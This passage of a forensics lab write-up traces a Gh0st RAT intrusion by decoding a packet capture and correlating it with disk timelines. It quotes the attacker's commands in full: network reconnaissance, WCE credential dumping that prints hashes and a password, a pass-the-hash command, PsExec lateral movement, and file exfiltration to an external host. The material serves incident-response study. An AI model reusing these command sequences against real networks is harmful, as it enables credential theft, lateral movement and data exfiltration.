			-> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
		Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written)
			<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097
			-> 58.64.132.141:80 seq [2669490715] (file: jackcr-challenge.pcap)
		Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written)
			<172.16.150.20> TCP packet flags [0x18: PUSH ACK ] 172.16.150.20:1097
			-> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
		Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written)
			<58.64.132.141> TCP packet flags [0x12: SYN ACK ] 58.64.132.141:80
			-> 172.16.150.20:1097 seq [1849965829] (file: jackcr-challenge.pcap)
		[snip]
		```
		- malicious IP seems to be more than just dropper
	- view network traffic with *Wireshark*:
		![[Gh0st_pcap.png]]
		- seems to be obfuscated
	- easily decoded with *Chopshop*:
		``` data
		$ chopshop -f jackcr-challenge.pcap gh0st_decode -F decrypted.txt
		[snip]
		C:\WINDOWS\system32>
		cd ..
		C:\WINDOWS>
		mkdir webui
		C:\WINDOWS>
		cd webui
		C:\WINDOWS\webui>
		ipconfig
		Windows IP Configuration
		Ethernet adapter Local Area Connection:
			Connection-specific DNS Suffix . :
			IP Address. . . . . . . . . . . . : 172.16.150.20
			Subnet Mask . . . . . . . . . . . : 255.255.255.0
			Default Gateway . . . . . . . . . : 172.16.150.2
		```
		- can confirm creation of `C:\WINDOWS\webui` directory 
		- can confirm execution of *ipconfig*
		``` data
		[snip]
		COMMAND: FILE SIZE (C:\WINDOWS\ps.exe: 381816)
		TOKEN: DATA CONTINUE
		COMMAND: FILE DATA (8183)
		TOKEN: DATA CONTINUE
		[snip]
		COMMAND: FILE SIZE (C:\WINDOWS\webui\gs.exe: 303104)
		TOKEN: DATA CONTINUE
		COMMAND: FILE DATA (8183)
		TOKEN: DATA CONTINUE
		[snip]
		COMMAND: LIST FILES (C:\WINDOWS\webui\)
		TOKEN: FILE LIST
		TYPE NAME SIZE WRITE TIME
		FILE gs.exe 303104 129984448080090049
		COMMAND: FILE SIZE (C:\WINDOWS\webui\ra.exe: 403968)
		TOKEN: DATA CONTINUE
		COMMAND: FILE DATA (8183)
		[snip]
		```
		- Gh0st RAT seems to give progress meter as file is uploaded
		``` data
		C:\WINDOWS\webui>
		ipconfig /all >> netuse.dll
		net view >> netuse.dll
		C:\WINDOWS\webui>
		net localgroup administrators >> netuse.dll
		C:\WINDOWS\webui>
		net sessions >> netuse.dll
		C:\WINDOWS\webui>
		net share >> netuse.dll
		C:\WINDOWS\webui>
		net start >> netuse.dll
		C:\WINDOWS\webui>
		sl.exe -bht 445,80,443,21,1433 172.16.150.1-254 >> netuse.dll
		ScanLine (TM) 1.01
		Copyright (c) Foundstone, Inc. 2002
		http://www.foundstone.com
		5 IPs and 25 ports scanned in 0 hours 0 mins 13.08 secs
		C:\WINDOWS\webui>
		gs -a >> netuse.dll
		0043B820
		[snip]
		COMMAND: DOWN FILES (C:\WINDOWS\webui\netuse.dll)
		TOKEN: FILE SIZE (C:\WINDOWS\webui\netuse.dll: 11844)
		COMMAND: CONTINUE
		[snip]
		TOKEN: TRANSFER FINISH
		```
		- dll files seem to be reconnaissance information
		- *sl.exe* is *ScanLine Portscanner*
		- password hashes extracted using *gs.exe* are collected in *netuse.dll*
		``` data
		ping DC-USTXHOU
		Pinging dc-ustxhou.petro-market.org [172.16.150.10] with 32 bytes of data:
		Reply from 172.16.150.10: bytes=32 time<1ms TTL=128
		C:\WINDOWS\webui>
		ping IIS-SARIYADH-03
		Pinging IIS-SARIYADH-03.petro-market.org [172.16.223.47] with 32 bytes of data:
		Reply from 172.16.223.47: bytes=32 time=2ms TTL=127
		```
		- *ping* is used to test connectivity to other machines
		- verifies attacker was leveraging previously extracted reconnaissance information
		``` data
		wc.exe -l
		WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security
		- by Hernan Ochoa (hernan@ampliasecurity.com)
		Use -h for help.
		callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
		913EA458A16E7
		ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
		5252FA87ED40AF8C46D8B1E2
		C:\WINDOWS\webui>
		wc.exe -w
		WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security
		- by Hernan Ochoa (hernan@ampliasecurity.com)
		Use -h for help.
		callb\PETRO-MARKET:Mar1ners@4655
		NETWORK SERVICE\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nkx [snip]
		ENG-USTXHOU-148$\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nk[[snip]
		ps.exe \\172.16.150.10 -u petro1-market\callb -p Mar1ners@4655 -accepteula cmd /c ipconfig
		[snip]
		The handle is invalid.
		Connecting to 172.16.150.10...Couldn't access 172.16.150.10
		C:\WINDOWS\webui>
		```
		- confirms *wc.exe* is *Windows Credentials Editor*
		- attacker dumped credentials and attempted to login to another machine with *ps.exe*
		- attempt to connect to 172.16.150.10 (`DC-USTXHOU`) failed
		``` data
		wc.exe -s sysbackup:current:c2a3915df2ec79ee73108eb48073acb7:
		e7a6f270f1ba562a90e2c133a95d2057
		WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security
		- by Hernan Ochoa (hernan@ampliasecurity.com)
		Use -h for help.
		Changing NTLM credentials of current logon session (000003E7h) to:
		Username: sysbackup
		domain: current
		LMHash: c2a3915df2ec79ee73108eb48073acb7
		NTHash: e7a6f270f1ba562a90e2c133a95d2057
		NTLM credentials successfully changed!
		```
		- attacker changes credentials for `sysbackup` user after failed atempts to use *PsExec*
		``` data
		ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula cmd /c ipconfig
		PsExec v1.98 - Execute processes remotely
		Copyright (C) 2001-2010 Mark Russinovich
		Sysinternals - www.sysinternals.com
		The file exists.
		Connecting to 172.16.223.47...^M^M^MStarting PsExec service on
		172.16.223.47...^M^M^MConnecting with PsExec service on
		172.16.223.47...^M^M^MCopying C:\WINDOWS\system32\ipconfig.exe to
		172.16.223.47...^M^M^MError copying C:\WINDOWS\system32\ipconfig.exe to
		remote system:
		```
		- attacker is eventually successful at using *PsExec* to run commands on `IIS-SARIYADH-03`
	- export decoded streams in body format:
		``` sh
		$ chopshop -f jackcr-challenge.pcap gh0st_decode_body -F decrypted.body
		$ cat decrypted.body >> largetimeline.txt
		```
	- can view commands in timeline:
		``` data
		Mon Nov 26 2012 23:07:31,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: ipconfig /all >> netuse.dll
		Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\iertutil.dll (Offset: 0x5ba2800)
		Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\urlmon.dll (Offset: 0x328a800)
		Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wininet.dll (Offset: 0x328b800)
		Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll (Offset: 0xde4e48)
		Mon Nov 26 2012 23:07:31,macb,[ENG MFT STD_INFO] WINDOWS\webui\netuse.dll (Offset: 0xde4e48)
		```
		- shows *ipconfig* command and changes it made
		- network APIs are accessed after *ipconfig* command
		- *netuse.dll* was created to store output
		``` data
		Mon Nov 26 2012 23:07:52,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
		Mon Nov 26 2012 23:07:53,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
		Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
		Mon Nov 26 2012 23:08:25,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net localgroup administrators >> netuse.dll
		Mon Nov 26 2012 23:08:26,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net localgroup administrators >> netuse.dll
		Mon Nov 26 2012 23:08:26,macb,[ENG MFT STD_INFO] WINDOWS\Prefetch\NET1EX~1.PF (Offset: 0x2bbee0)
		Mon Nov 26 2012 23:08:41,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net sessions >> netuse.dll
		Mon Nov 26 2012 23:08:56,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net share >> netuse.dll
		Mon Nov 26 2012 23:09:18,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
		Mon Nov 26 2012 23:09:19,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
		```
		- *net* commands are redirected to *netuse.dll*
		- Prefetch files for *net* are created
7. correlating traffic with timeline:
	- search for artifacts related to *PsExec* on `IIS-SARIYADH-03`:
		``` data
		Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode]
			172.16.150.20:1098->58.64.132.141:80 
			SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula 
			cmd /c ipconfig
		Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode]
			172.16.150.20:1098->58.64.132.141:80
			SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula
			cmd /c ipconfig;;PsExec v1.98 -
		Execute processes remotely;Copyright (C) 2001-2010 Mark Russinovich;
		Sysinternals - www.sysinternals.com;
		```
		- can see *PsExec* commands attacker issued to `IIS`
		``` data
		Tue Nov 27 2012 00:05:48,macb,[IIS MFT FILE_NAME] WINDOWS\PSEXESVC.EXE (Offset: 0x1da1b000)
		Tue Nov 27 2012 00:05:48,macb,[IIS MFT STD_INFO] WINDOWS\PSEXESVC.EXE (Offset: 0x1da1b000)
		```
		- *PSEXESVC.EXE* files created on `IIS`
		``` data
		Tue Nov 27 2012 00:05:49,macb,[Gh0st Decode]
			172.16.150.20:1098->58.64.132.141:80
			SHELL: The file exists.;Connecting to 172.16.223.47...
			Starting PsExec service on 172.16.223.47...
			Connecting with PsExec service on 172.16.223.47...
			Copying C:\WINDOWS\system32\ipconfig.exe to 172.16.223.47...
			Error copying C:\WINDOWS\system32\ipconfig.exe to remote system:;;
			C:\WINDOWS\webui>
		Tue Nov 27 2012 00:05:49,0,macb,,0,0,0,[IIS PROCESS LastTrimTime] PSEXESVC.EXE PID: 268/PPID: 528/POffset: 0x0237f2b0
		Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE PID: 268/PPID: 528/POffset: 0x0237f2b0
		Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE PID: 268/PPID: 528/POffset: 0x0dd2e2b0
		Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE PID: 268/PPID: 528/POffset: 0x172de2b0
		```
		- service starts on `IIS`
		``` data
		Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry]
			$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC
		Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry None]
			$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC\0000
		Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry]
			$$$PROTO.HIV\ControlSet001\Services\PSEXESVC
		Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry]
			$$$PROTO.HIV\ControlSet001\Services\PSEXESVC\Security
		```
		- registry keys associated with `PsExec` are modified on `IIS` as process starts
		``` data
		Tue Nov 27 2012 00:46:10,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
		Tue Nov 27 2012 00:46:10,macb,[FLD SYMLINK]
			Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z
			POffset: 284628328/Ptr: 1/Hnd: 0
		```
		- attacker maps network share from `IIS` to `z:` of `FLD`
		``` data
		Tue Nov 27 2012 00:48:19,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: net use z: \\172.16.223.47\z
		Tue Nov 27 2012 00:48:20,.a..,[ENG Registry] $$$PROTO.HIV\Network\z
		Tue Nov 27 2012 00:48:20,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: The command completed successfully.;;;C:\WINDOWS\webui>
		```
		- within 2 seconds *net use* is used to map network share from `IIS` to `z:`
		- command results in modification to `Network\z` reigstry key
		``` data
		Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\system.dll .
		Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;; C:\WINDOWS\webui>
		Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll (Offset: 0x924e800)
		[snip]
		Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
		Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;; C:\WINDOWS\webui>
		Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll (Offset: 0x1dec3000)
		Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll (Offset: 0x924ec00)
		[snip]
		Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .
		Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .; 1 file(s) copied.;;C:\WINDOWS\webui>
		Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll (Offset: 0x109cf7a8)
		Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\ .
		Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\netstat.dll .; 1 file(s) copied.;;C:\WINDOWS\webui>
		Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll (Offset: 0x10b97400)
		```
		- attacker copies off files immediately after mapping drive
		``` data
		Tue Nov 27 2012 00:43:34,mac.,[FLD MFT STD_INFO] WINDOWS\system1.bat (Offset: 0x1787f000)
		Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat (Offset: 0x1787f800)
		Tue Nov 27 2012 00:44:16,mac.,[FLD MFT STD_INFO] WINDOWS\Prefetch\PSEXE-~2.PF
		Tue Nov 27 2012 00:44:16,.a..,[IIS MFT STD_INFO] WINDOWS\system32\net1.exe
		```
		- seems attacker executed commands on `IIS`
		- *system1.bat* and *system6.bat* accessed on `FLD` immediately before *PsExec*
		- at same time *net1.exe* is accessed on `IIS`
	- search for *system2.bat*
		``` data
		Tue Nov 27 2012 00:53:29,368,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat (Offset: 0x1787fc00)
		Tue Nov 27 2012 00:53:49,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\gs.exe (Offset: 0x1be1d400)
		Tue Nov 27 2012 00:55:41,344,macb,[IIS MFT FILE_NAME] WINDOWS\webui\svchost.dll (Offset: 0x1dec3000)
		Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
		Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;;C:\WINDOWS\webui>
		Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll (Offset: 0x1dec3000)
		Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll (Offset: 0x924ec00)
		```
		- *system2.bat* is accessed on `FLD`; shortly after *gs.exe* and *svchost.dll* appear on `IIS`, confirming *system2.bat* was run on `IIS` because it redirects output to *svchost.dll*
	- search for *system3.bat*:
		``` data
		Tue Nov 27 2012 00:59:00,352,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat (Offset: 0x1b773000)
		Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1 (Offset: 0x1d836800)
		Tue Nov 27 2012 01:00:27,480,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1\Start Menu\Programs (Offset: 0x1c5e0800)
		Tue Nov 27 2012 01:00:27,448,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1\Start Menu\Programs\Startup (Offset: 0x1c5e0c00)
		Tue Nov 27 2012 01:00:27,824,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1\Start Menu\Programs\Accessories\ENTERT~1 (Offset: 0x1ce3c400)
		Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1\Start Menu\Programs\Accessories\ACCESS~1 (Offset: 0x1ce3c800)
		Tue Nov 27 2012 01:00:27,472,.a..,[IIS MFT STD_INFO] Documents and Settings\ADMINI~1\SendTo (Offset: 0x1ce3cc00)
		```
		- *system3.bat* is accessed on `FLD` and burst of activity occurs on `IIS`
	- search for *systesm4.bat*:
		``` data
		Tue Nov 27 2012 01:04:59,432,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat (Offset: 0x1b773400)
		Tue Nov 27 2012 01:05:24,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\ra.exe (Offset: 0x1bf7e000)
		Tue Nov 27 2012 01:05:55,344,macb,-------------D-,0,0,10877,[IIS MFT FILE_NAME] Documents and Settings\SYSBAC~1\APPLIC~1\WinRAR (Offset: 0x1cedc400)
		```
		- created and accessed on `FLD`
		- *ra.exe* appears on `IIS` as result of *system4.bat* running via *PsExec*
		- WinRAR directory is created when *WinRAR* is run; based on contents of *system4.bat*, files were compressed into *netstat.dll*
	- search timeline:
		``` data
		Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump100.dwg (Offset: 0x1a890c00)
		Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump11.dwg (Offset: 0x1a8fb800)
		Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump12.dwg (Offset: 0x1a8fbc00)
		Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump13.dwg (Offset: 0x1a18f000)
		Tue Nov 27 2012 01:11:21,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump14.dwg (Offset: 0x1a18f400)
		[snip]
		Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump97.dwg (Offset: 0x25f7800)
		Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump98.dwg (Offset: 0x25f7c00)
		Tue Nov 27 2012 01:11:40,.a..,[IIS MFT STD_INFO] ENGINE~1\Designs\Pumps\pump99.dwg (Offset: 0x25f8000)
		Tue Nov 27 2012 01:11:40,mac.,[IIS MFT STD_INFO] WINDOWS\webui\netstat.dll (Offset: 0x1cedc800)
		Tue Nov 27 2012 01:11:40,m...,[ENG MFT STD_INFO] WINDOWS\webui\netstat.dll (Offset: 0x10b97400)
		```
		- several files with *.dwg* are accessed and *netstat.dll* is created
		``` data
		Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode]
		172.16.150.20:1238->58.64.132.141:80 COMMAND: DOWN FILES
		(C:\WINDOWS\webui\netstat.dll)
		Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode]
		172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (2713)
		Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode]
		172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (8183)
		Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode]
		172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE SIZE
		(C:\WINDOWS\webui\netstat.dll: 109092)
		Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode]
		172.16.150.20:1238->58.64.132.141:80 TOKEN: TRANSFER FINISH
		```
		- *netstat.dll* is later downloaded to attacker's local machine 

## 9. Gh0st in the Enterprise wrap up
- attacker had access to 2 machines `ENG` and `FLD` due to phishing email
- attacker modified credentials to move laterally to third machine `IIS`
- attacker obtained information about network and dumped hashes from all three machines
- network share from `IIS` was mounted on both `ENG` and `FLD` for copying files to attacker
- attacker downloaded several files containing information about network and password hashes as well as files with *.dwg* extension
- files were copied back to *ENG* and ultimately to attacker
